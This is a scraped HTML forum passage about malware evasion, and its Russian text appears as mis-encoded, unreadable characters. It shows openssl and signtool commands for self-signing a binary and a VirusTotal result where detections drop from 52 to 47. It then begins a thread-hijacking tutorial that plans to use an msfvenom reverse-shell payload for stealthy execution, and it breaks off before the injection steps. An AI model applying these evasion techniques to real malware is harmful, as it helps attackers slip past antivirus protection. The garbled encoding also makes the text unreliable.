–ü–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã, —Å–∏—Å—Ç–µ–º–∞ –ø–æ–ø—Ä–æ—Å–∏—Ç –≤–∞—Å –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å –¥–µ—Ç–∞–ª–∏ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∞, —Ç–∞–∫–∏–µ –∫–∞–∫ —Å—Ç—Ä–∞–Ω–∞, –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—è –∏ —Ç–∞–∫ –¥–∞–ª–µ–µ. –ü–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —ç—Ç–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ —É –≤–∞—Å –±—É–¥–µ—Ç –≥–æ—Ç–æ–≤ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç –∏ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–π –µ–º—É –∑–∞–∫—Ä—ã—Ç—ã–π –∫–ª—é—á.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780941306.png"
		data-src="https://osint42.org/attachments/1746780941306-png.117/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780941306-png.117/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780941306.png"
			title="1746780941306.png"
			width="702" height="348" loading="lazy" />
	</div><br />
<br />
<b>–î–∞–ª–µ–µ, –≥–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Ñ–∞–π–ª pfx, –∏—Å–ø–æ–ª—å–∑—É—è —Ñ–∞–π–ª—ã pem.</b> –ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –ø–æ—Ç—Ä–µ–±—É–µ—Ç –≤–≤–æ–¥–∞ –∫–ª—é—á–µ–≤–æ–π —Ñ—Ä–∞–∑—ã.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>openssl pkcs12 -inkey key.pem -in cert.pem -export -out sign.pfx</code></pre>
	</div>
</div><br />
–ü—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã –≤–∞–º –±—É–¥–µ—Ç –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–æ –≤–≤–µ—Å—Ç–∏ –ø–∞—Ä–æ–ª—å –¥–ª—è –∑–∞–∫—Ä—ã—Ç–æ–≥–æ –∫–ª—é—á–∞ (–µ—Å–ª–∏ –≤—ã —É—Å—Ç–∞–Ω–æ–≤–∏–ª–∏ –µ–≥–æ —Ä–∞–Ω–µ–µ) –∏ –∑–∞—Ç–µ–º –∑–∞–¥–∞—Ç—å –ø–∞—Ä–æ–ª—å –¥–ª—è –Ω–æ–≤–æ–≥–æ —Ñ–∞–π–ª–∞ pfx. –≠—Ç–æ—Ç –ø–∞—Ä–æ–ª—å –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è –≤ –¥–∞–ª—å–Ω–µ–π—à–µ–º, –∫–æ–≥–¥–∞ –≤—ã –±—É–¥–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ–∞–π–ª pfx –¥–ª—è –ø–æ–¥–ø–∏—Å–∏ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ–∞–π–ª–æ–≤ –∏–ª–∏ –¥—Ä—É–≥–∏—Ö —Ü–µ–ª–µ–π.<br />
<br />
–§–∞–π–ª PFX (—Ç–∞–∫–∂–µ –∏–∑–≤–µ—Å—Ç–Ω—ã–π –∫–∞–∫ PKCS #12) –∫–æ–º–±–∏–Ω–∏—Ä—É–µ—Ç —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç –∏ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–π –µ–º—É –∑–∞–∫—Ä—ã—Ç—ã–π –∫–ª—é—á –≤ –æ–¥–∏–Ω —Ñ–∞–π–ª, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –¥–ª—è –∏–º–ø–æ—Ä—Ç–∞ –∏ —ç–∫—Å–ø–æ—Ä—Ç–∞ –º–µ–∂–¥—É —Å–∏—Å—Ç–µ–º–∞–º–∏ –∏–ª–∏ –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ —Ö—Ä–∞–Ω–µ–Ω–∏—è.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780949500.png"
		data-src="https://osint42.org/attachments/1746780949500-png.118/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780949500-png.118/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780949500.png"
			title="1746780949500.png"
			width="659" height="125" loading="lazy" />
	</div><br />
<br />
<b>–ü–æ–¥–ø–∏—Å–∞–Ω–∏–µ –ë–∏–Ω–∞—Ä–Ω–æ–≥–æ –§–∞–π–ª–∞</b><br />
–î–ª—è –ø–æ–¥–ø–∏—Å–∏ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ —Ç—Ä–µ–±—É–µ—Ç—Å—è —É—Ç–∏–ª–∏—Ç–∞ signtool.exe, –∫–æ—Ç–æ—Ä–∞—è —è–≤–ª—è–µ—Ç—Å—è —á–∞—Å—Ç—å—é Windows SDK. –ï–µ –º–æ–∂–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å <a href="https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/" target="_blank" class="link link--external" rel="noopener">[–∑–¥–µ—Å—å]</a>.<br />
–ü–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª –º–æ–∂–Ω–æ –ø–æ–¥–ø–∏—Å–∞—Ç—å —Å –ø–æ–º–æ—â—å—é —É–∫–∞–∑–∞–Ω–Ω–æ–π –Ω–∏–∂–µ –∫–æ–º–∞–Ω–¥—ã.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>signtool sign /f sign.pfx /p &lt;pfx-password&gt; /t http://timestamp.digicert.com /fd sha256 binary.exe</code></pre>
	</div>
</div><br />
–ü—Ä–æ—Å–º–æ—Ç—Ä —Å–≤–æ–π—Å—Ç–≤ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ —Ç–µ–ø–µ—Ä—å –±—É–¥–µ—Ç –ø–æ–∫–∞–∑—ã–≤–∞—Ç—å –≤–∫–ª–∞–¥–∫—É &quot;–¶–∏—Ñ—Ä–æ–≤–∞—è –ø–æ–¥–ø–∏—Å—å&quot;, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–π –æ—Ç–æ–±—Ä–∞–∂–∞—é—Ç—Å—è –¥–µ—Ç–∞–ª–∏ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∞, –∏—Å–ø–æ–ª—å–∑—É–µ–º–æ–≥–æ –¥–ª—è –ø–æ–¥–ø–∏—Å–∏ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞. –¢–∞–∫–∂–µ –±—É–¥–µ—Ç –ø–æ–∫–∞–∑–∞–Ω–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ –æ —Ç–æ–º, —á—Ç–æ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç –Ω–µ –¥–æ–≤–µ—Ä–µ–Ω.<br />
<br />
<b>–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ:</b> –°–∞–º–æ–ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–π —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç, –æ—á–µ–≤–∏–¥–Ω–æ, –Ω–µ –±—É–¥–µ—Ç –∏–º–µ—Ç—å –¥–æ–≤–µ—Ä–∏—è –Ω–∞ –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–µ —Å–∏—Å—Ç–µ–º. –ï—Å–ª–∏ –≤–∞–º –Ω—É–∂–Ω–æ –¥–æ–≤–µ—Ä–∏–µ –∫ –≤–∞—à–µ–º—É —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç—É, –≤–∞–º —Å–ª–µ–¥—É–µ—Ç –ø—Ä–∏–æ–±—Ä–µ—Å—Ç–∏ –µ–≥–æ —É –∞–∫–∫—Ä–µ–¥–∏—Ç–æ–≤–∞–Ω–Ω–æ–≥–æ —É–¥–æ—Å—Ç–æ–≤–µ—Ä—è—é—â–µ–≥–æ —Ü–µ–Ω—Ç—Ä–∞. –ü–æ–¥–ø–∏—Å—å –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞, –¥–∞–∂–µ —Å–∞–º–æ–ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–º —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–æ–º, –º–æ–∂–µ—Ç —Å–Ω–∏–∑–∏—Ç—å –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å –µ–≥–æ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –Ω–µ–∫–æ—Ç–æ—Ä—ã–º–∏ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–∞–º–∏, –Ω–æ –≤—Å–µ –∂–µ —ç—Ç–æ –Ω–µ –≥–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ—Ç –ø–æ–ª–Ω–æ–µ –¥–æ–≤–µ—Ä–∏–µ –∫ —Ñ–∞–π–ª—É.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780959052.png"
		data-src="https://osint42.org/attachments/1746780959052-png.119/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780959052-png.119/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780959052.png"
			title="1746780959052.png"
			width="441" height="493" loading="lazy" />
	</div><br />
<br />
<b>–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç–µ–ø–µ–Ω–∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –ø–æ–¥–ø–∏—Å–∞–Ω–Ω–æ–≥–æ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞</b><br />
<br />
–ë–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª –±—ã–ª –∑–∞–≥—Ä—É–∂–µ–Ω –æ–±—Ä–∞—Ç–Ω–æ –Ω–∞ VirusTotal, —á—Ç–æ–±—ã –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, –æ–∫–∞–∑–∞–ª–æ –ª–∏ –ø–æ–¥–ø–∏—Å–∞–Ω–∏–µ –≤–ª–∏—è–Ω–∏–µ –Ω–∞ —Å—Ç–µ–ø–µ–Ω—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è. –ö–∞–∫ –º–æ–∂–Ω–æ –±—ã–ª–æ –æ–∂–∏–¥–∞—Ç—å, –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–∏—Å—Ç–µ–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –∫–æ—Ç–æ—Ä—ã–µ –æ—Ç–º–µ—Ç–∏–ª–∏ —Ñ–∞–π–ª –∫–∞–∫ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π, —Å–æ–∫—Ä–∞—Ç–∏–ª–æ—Å—å —Å 52 –¥–æ 47. –ù–∞ –ø–µ—Ä–≤—ã–π –≤–∑–≥–ª—è–¥ —ç—Ç–æ –º–æ–∂–µ—Ç –Ω–µ –ø–æ–∫–∞–∑–∞—Ç—å—Å—è –∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω—ã–º —É–º–µ–Ω—å—à–µ–Ω–∏–µ–º,<b><u> –Ω–æ —Å–ª–µ–¥—É–µ—Ç –ø–æ–¥—á–µ—Ä–∫–Ω—É—Ç—å, —á—Ç–æ –∫ —Ñ–∞–π–ª—É –Ω–µ –±—ã–ª–∏ –≤–Ω–µ—Å–µ–Ω—ã –Ω–∏–∫–∞–∫–∏–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è, –∫—Ä–æ–º–µ –µ–≥–æ –ø–æ–¥–ø–∏—Å–∏ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–æ–º.</u></b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780969377.png"
		data-src="https://osint42.org/attachments/1746780969377-png.120/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780969377-png.120/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780969377.png"
			title="1746780969377.png"
			width="1326" height="746" loading="lazy" />
	</div><br />
<br />
<b>–í—ã–≤–æ–¥:</b><br />
<br />
–ü–æ–¥–ø–∏—Å–∞–Ω–∏–µ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –º–æ–∂–µ—Ç –≤–ª–∏—è—Ç—å –Ω–∞ –µ–≥–æ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º–∞–º–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –≠—Ç–æ –ø–æ–¥—á–µ—Ä–∫–∏–≤–∞–µ—Ç –≤–∞–∂–Ω–æ—Å—Ç—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∏ –∫–æ–Ω—Ç—Ä–æ–ª—è –Ω–∞–¥ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–æ–≤, –∞ —Ç–∞–∫–∂–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å –¥–ª—è –∫–æ–º–ø–∞–Ω–∏–π –∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –æ—Å—Ç–∞–≤–∞—Ç—å—Å—è –Ω–∞—Å—Ç–æ—Ä–æ–∂–µ –¥–∞–∂–µ –≤ –æ—Ç–Ω–æ—à–µ–Ω–∏–∏ –ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤. –ù–∞ –ø—Ä–∞–∫—Ç–∏–∫–µ –ø–æ–¥–ø–∏—Å–∞–Ω–∏–µ –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞–º–∏ –∫–∞–∫ –æ–¥–∏–Ω –∏–∑ –º–µ—Ç–æ–¥–æ–≤ —É–º–µ–Ω—å—à–µ–Ω–∏—è –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç–∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –∏—Ö –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û.</div>
						

							<h2>–ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É Thread Hijacking</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746781068918.png"
		data-src="https://osint42.org/attachments/1746781068918-png.121/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781068918-png.121/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781068918.png"
			title="1746781068918.png"
			width="1134" height="708" loading="lazy" />
	</div><br />
<br />
<b>Thread Hijacking (–ü–æ—Ö–∏—â–µ–Ω–∏–µ –ø–æ—Ç–æ–∫–∞)</b> - —ç—Ç–æ —Ç–µ—Ö–Ω–∏–∫–∞, –ø–æ–∑–≤–æ–ª—è—é—â–∞—è –≤—ã–ø–æ–ª–Ω—è—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –±–µ–∑ —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞. –≠—Ç–æ—Ç –º–µ—Ç–æ–¥ —Ä–∞–±–æ—Ç–∞–µ—Ç –ø—É—Ç–µ–º –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø–æ—Ç–æ–∫–∞ –∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Ä–µ–≥–∏—Å—Ç—Ä–∞ –∞–¥—Ä–µ—Å–∞ –∫–æ–º–∞–Ω–¥—ã, —É–∫–∞–∑—ã–≤–∞—é—â–µ–≥–æ –Ω–∞ —Å–ª–µ–¥—É—é—â—É—é –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é –≤ –ø–∞–º—è—Ç–∏, <b><u>—á—Ç–æ–±—ã –æ–Ω —É–∫–∞–∑—ã–≤–∞–ª –Ω–∞ –Ω–∞—á–∞–ª–æ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.</u></b> –ö–æ–≥–¥–∞ –ø–æ—Ç–æ–∫ –≤–æ–∑–æ–±–Ω–æ–≤–ª—è–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ, –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞.<br />
<br />
–í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ –±—É–¥–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Msfvenom TCP reverse shell payload, –∞ –Ω–µ –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É calc., –ø–æ—Ç–æ–º—É —á—Ç–æ –æ–Ω–∞ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –ø–æ—Ç–æ–∫ –ø–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è, —Ç–æ–≥–¥–∞ –∫–∞–∫ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ calc –∑–∞–≤–µ—Ä—à–∏–ª–∞ –±—ã –ø–æ—Ç–æ–∫ –ø–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
–¢–µ–º –Ω–µ –º–µ–Ω–µ–µ, –æ–±–µ –ø–æ–ª–µ–∑–Ω—ã–µ –Ω–∞–≥—Ä—É–∑–∫–∏ —Ä–∞–±–æ—Ç–∞—é—Ç, –Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –ø–æ—Ç–æ–∫–∞ –ø–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø—Ä–æ–≤–æ–¥–∏—Ç—å –¥–∞–ª—å–Ω–µ–π—à–∏–π –∞–Ω–∞–ª–∏–∑.<br />
<br />
<b>–ö–æ–Ω—Ç–µ–∫—Å—Ç –ü–æ—Ç–æ–∫–∞</b><br />
<br />
–ü—Ä–µ–∂–¥–µ —á–µ–º –º–æ–∂–Ω–æ –æ–±—ä—è—Å–Ω–∏—Ç—å —ç—Ç—É —Ç–µ—Ö–Ω–∏–∫—É, –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–Ω—è—Ç—å —á—Ç–æ —Ç–∞–∫–æ–µ –∫–æ–Ω—Ç–µ–∫—Å—Ç –ø–æ—Ç–æ–∫–∞. –£ –∫–∞–∂–¥–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –µ—Å—Ç—å –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç –ø–ª–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –∏ –æ–Ω —Å–æ–¥–µ—Ä–∂–∏—Ç —Ä—è–¥ —Å—Ç—Ä—É–∫—Ç—É—Ä, –∫–æ—Ç–æ—Ä—ã–µ —Å–∏—Å—Ç–µ–º–∞ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –ø–æ—Ç–æ–∫–∞. –ö–æ–Ω—Ç–µ–∫—Å—Ç –ø–æ—Ç–æ–∫–∞ –≤–∫–ª—é—á–∞–µ—Ç –≤—Å—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é, –Ω–µ–æ–±—Ö–æ–¥–∏–º—É—é –ø–æ—Ç–æ–∫—É –¥–ª—è –±–µ—Å–ø–µ—Ä–µ–±–æ–π–Ω–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è, –≤–∫–ª—é—á–∞—è –Ω–∞–±–æ—Ä —Ä–µ–≥–∏—Å—Ç—Ä–æ–≤ –¶–ü–£ –ø–æ—Ç–æ–∫–∞ –∏ —Å—Ç–µ–∫.<br />
<br />
GetThreadContext –∏ SetThreadContext - —ç—Ç–æ –¥–≤–∞ WinAPI, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞ –ø–æ—Ç–æ–∫–∞ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ.<br />
<br />
GetThreadContext –∑–∞–ø–æ–ª–Ω—è–µ—Ç —Å—Ç—Ä—É–∫—Ç—É—Ä—É CONTEXT, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–¥–µ—Ä–∂–∏—Ç –≤—Å—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ—Ç–æ–∫–µ. –í —Ç–æ –≤—Ä–µ–º—è –∫–∞–∫ SetThreadContext –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –∑–∞–ø–æ–ª–Ω–µ–Ω–Ω—É—é —Å—Ç—Ä—É–∫—Ç—É—Ä—É CONTEXT –∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –µ–µ –¥–ª—è —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞.<br />
<br />
–≠—Ç–∏ –¥–≤–∞ WinAPI –∏–≥—Ä–∞—é—Ç –∫–ª—é—á–µ–≤—É—é —Ä–æ–ª—å –≤ –ø–æ—Ö–∏—â–µ–Ω–∏–∏ –ø–æ—Ç–æ–∫–∞, –ø–æ—ç—Ç–æ–º—É –±—ã–ª–æ –±—ã –ø–æ–ª–µ–∑–Ω–æ –∏–∑—É—á–∏—Ç—å WinAPI –∏ —Å–≤—è–∑–∞–Ω–Ω—ã–µ —Å –Ω–∏–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã.<br />
<br />
<b>–ü–æ—Ö–∏—â–µ–Ω–∏–µ –ü–æ—Ç–æ–∫–∞ vs –°–æ–∑–¥–∞–Ω–∏–µ –ü–æ—Ç–æ–∫–∞</b><br />
<br />
–ü–µ—Ä–≤—ã–π –≤–æ–ø—Ä–æ—Å, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ —Ä–µ—à–∏—Ç—å: –ø–æ—á–µ–º—É –ø–æ—Ö–∏—â–∞—Ç—å —Å–æ–∑–¥–∞–Ω–Ω—ã–π –ø–æ—Ç–æ–∫ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, –∞ –Ω–µ –≤—ã–ø–æ–ª–Ω—è—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É, –∏—Å–ø–æ–ª—å–∑—É—è –Ω–æ–≤—ã–π —Å–æ–∑–¥–∞–Ω–Ω—ã–π –ø–æ—Ç–æ–∫?<br />
<br />
<b>–û—Å–Ω–æ–≤–Ω–æ–µ —Ä–∞–∑–ª–∏—á–∏–µ - —ç—Ç–æ –≤–∏–¥–∏–º–æ—Å—Ç—å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∏ —Å–∫—Ä—ã—Ç–Ω–æ—Å—Ç—å.</b><br />
–°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —Ä–∞—Å–∫—Ä–æ–µ—Ç –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∏, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, —Å–æ–¥–µ—Ä–∂–∞–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, —Ç–∞–∫ –∫–∞–∫ –∑–∞–ø–∏—Å—å –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –¥–æ–ª–∂–Ω–∞ —É–∫–∞–∑—ã–≤–∞—Ç—å –Ω–∞ –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ –ø–∞–º—è—Ç–∏.<br />
<b>–≠—Ç–æ –Ω–µ —Ç–∞–∫ –ø—Ä–∏ –ø–æ—Ö–∏—â–µ–Ω–∏–∏ –ø–æ—Ç–æ–∫–∞,</b> –ø–æ—Ç–æ–º—É —á—Ç–æ –∑–∞–ø–∏—Å—å –ø–æ—Ç–æ–∫–∞ –±—É–¥–µ—Ç —É–∫–∞–∑—ã–≤–∞—Ç—å –Ω–∞ –æ–±—ã—á–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é –ø—Ä–æ—Ü–µ—Å—Å–∞, –∏ –ø–æ—Ç–æ–∫ –±—É–¥–µ—Ç –≤—ã–≥–ª—è–¥–µ—Ç—å –±–µ–∑–æ–±–∏–¥–Ω–æ.<br />
<br />
<b>–®–∞–≥–∏ –ü–æ—Ö–∏—â–µ–Ω–∏—è –õ–æ–∫–∞–ª—å–Ω–æ–≥–æ –ü–æ—Ç–æ–∫–∞</b><br />
<br />
–í —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ –æ–ø–∏—Å—ã–≤–∞—é—Ç—Å—è –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ —à–∞–≥–∏ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ—Ö–∏—â–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞, —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –≤ –ª–æ–∫–∞–ª—å–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ.<br />
<br />
